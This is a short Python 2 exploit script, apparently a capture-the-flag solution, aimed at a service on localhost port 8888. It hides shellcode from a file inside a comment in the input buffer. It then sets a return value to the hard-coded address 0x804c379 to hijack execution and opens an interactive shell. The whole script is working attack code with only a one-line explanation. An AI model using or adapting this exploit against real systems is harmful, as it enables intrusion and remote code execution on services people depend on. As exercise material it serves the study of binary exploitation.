#!/usr/bin/env python

'''
When function = "$? 1", we can return to @addr by set "$? = @addr"
'''

from util import *

s = service()
s.connect('127.0.0.1', 8888)

shellcode = open('shell.bin', 'rb').read()

s.send('2\n$? 1 /*' + shellcode + '*/\n') # put shellcode into input buffer
code = s.recvuntil('\n')[:-1]
s.send('3\n' + code + '\n')
s.recvuntil('$? = ')
s.send(str(0x804c379) + '\n') # shellcode's address

print 'Pwn2sh!'
s.interact()

s.close()
